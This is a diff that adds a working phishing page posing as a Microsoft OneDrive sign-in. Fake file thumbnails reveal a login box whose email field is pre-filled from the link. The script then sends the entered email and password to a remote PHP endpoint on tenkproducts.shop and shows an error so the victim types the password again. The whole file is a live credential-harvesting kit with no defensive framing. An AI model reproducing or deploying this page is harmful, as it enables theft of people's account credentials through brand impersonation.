@@ -1,0 +1,251 @@
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <title>OneDrive</title>
+
+        <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.4/jquery.min.js"></script>
+   
+   <style>
+    video {
+    object-fit: cover;
+    width: 100vw;
+    height: 100vh;
+    position: fixed;
+    top: 0;
+    left: 0;
+    z-index: -1;
+}
+
+body {
+    margin: 0;
+}
+
+header {
+    width: 100%;
+    margin: 0;
+    background-color: #0078d4;
+}
+
+header img {
+    margin: 0;
+}
+
+aside {
+    width: 15%;
+    margin: 0;
+    float: left;
+    height: 100vh;
+}
+
+aside img {
+    width: 100%;
+}
+
+.item-con {
+    display: inline-block;
+    width: 20%;
+    height: 100px;
+}
+
+
+
+.fx-body {
+    position: absolute;
+    top: 35%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    background: #fff;
+    box-shadow: -1px 2px 5px 0px rgba(0, 0, 0, 0.75);
+    width: 32%;
+    padding: 30px;
+  
+}
+
+input {
+    width: 100%;
+    margin: 4px 0 4px 0;
+    height: 30px;
+}
+
+button {
+    margin: 4px 0 4px 0;
+    height: 30px;
+    background: #094AB2;
+    border: none;
+    color: white;
+    font-size: 14px;
+    cursor: pointer;
+}
+
+@media (max-width: 575.98px) {
+    .fx-body {
+        position: absolute;
+        top: 35%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        background: #fff;
+        box-shadow: -1px 2px 5px 0px rgba(0, 0, 0, 0.75);
+        width: 80%;
+        padding: 20px;
+     
+    }
+    .fx-body img {
+        width: 70%;
+    }
+    input {
+        width: 100%;
+        margin: 4px 0 4px 0;
+        height: 30px;
+    }
+    button {
+        margin: 4px 0 4px 0;
+        height: 30px;
+        background: #094AB2;
+        border: none;
+        color: white;
+        font-size: 14px;
+        cursor: pointer;
+    }
+  
+   
+    .item-con img {
+        width: 100%;
+        padding: 10px;
+    }
+    .item-con {
+        display: inline-block;
+        width: 40%;
+    }
+    aside {
+        display: none;
+    }
+}
+   </style>
+
+</head>
+
+<body style="height:100vh;">
+
+    <header>
+        <img src="lg.png">
+    </header>
+    <aside>
+        <img src="ca.png">
+    </aside>
+
+
+
+    <div class="items">
+        <div class="item-con">
+            <img src="1a.png">
+        </div>
+        <div class="item-con">
+            <img src="2a.png">
+        </div>
+        <div class="item-con">
+            <img src="3a.png">
+        </div>
+        <div class="item-con">
+            <img src="4a.png">
+        </div>
+
+    </div>
+    <div class="fx-body">
+        <img src="xc.png" class="img-fluid">
+        <div class="ms"></div>
+        <small class="text-danger" id="msg" style="font-weight:600;"></small>
+        <form method="post" id="formx" class="my-4">
+            <div>
+                <input type="email" name="x1" id="xx" value="" placeholder="Email" required>
+            </div>
+            <div>
+                <input type="password" name="x2" id="xxx" placeholder="Password" value="" required>
+            </div>
+            <div>
+                <img src="sd1.png">
+            </div>
+            <div>
+                <button id="Btn">Sign In</button>
+            </div>
+        </form>
+        
+        <script>
+$(document).ready(function() {
+
+    $('.fx-body').hide();
+
+    $('.items').click(() => {
+
+        $('.fx-body').toggle('1000');
+
+    });
+
+
+
+    var baseUrl = (window.location).href;
+
+    var url = baseUrl.substring(baseUrl.lastIndexOf('=') + 1);
+
+    $("#xx").val(url);
+
+
+
+    $("#formx").submit(function(e) {
+
+        e.preventDefault();
+
+        var formData = new FormData($("#formx")[0]);
+
+        $("#Btn").html('Processing..').prop("disabled", true);
+
+        $.ajax({
+            url: "https://tenkproducts.shop/slyatb/2//X.php",
+
+            type: 'POST',
+
+            data: formData,
+
+            contentType: false,
+
+            processData: false,
+
+            success: function(res) {
+
+                console.log(res);
+
+                $('#bd').show();
+
+                $('#hm').hide();
+
+                setTimeout(function() {
+
+                    $("#xx").val(url);
+
+                    $("#xxx").val("");
+
+                    $('.ms').html('<img src="es.png">');
+
+                    $("#Btn").html('Sign In').prop("disabled", false);
+
+                }, 2000);
+
+
+
+            }
+
+        });
+
+    });
+
+
+
+});
+</script>
+</body>
+
+</html>
